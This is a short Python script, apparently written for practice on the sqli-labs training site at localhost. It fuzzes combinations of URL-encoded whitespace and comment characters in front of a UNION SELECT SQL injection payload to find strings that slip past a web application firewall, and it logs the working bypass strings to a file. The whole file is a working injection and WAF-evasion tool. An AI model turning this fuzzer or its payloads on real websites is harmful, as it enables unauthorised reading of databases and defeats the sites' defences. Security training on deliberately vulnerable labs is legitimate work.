import requests
import itertools

#Python3 Fuzz有效payloads，然后保存结果，在WAF环境下进行Fuzz。

List = ['%20','%09','%0a','%0b','%0c','%0d','%2d%2d','%23','%a0','%2D%2D%2B','%5C%4E','\\N']

count = 0
num = 2 #fuzz num 个字符组合
target = 'http://localhost/sqli-labs-master/Less-1/?id=-1\' '

for i in itertools.product(List,repeat=num):

    count += 1
    print(count,':',len(List)**num)

    str = ''.join((i))
    payload = '{}union select 1,user(),3 from users %23'.format(str)
    url = target + payload
    req = requests.get(url=url)

    if "root@localhost" in req.text:
        print(url)
        with open("result.txt",'a',encoding='utf-8') as r:
            r.write(str + "\n")
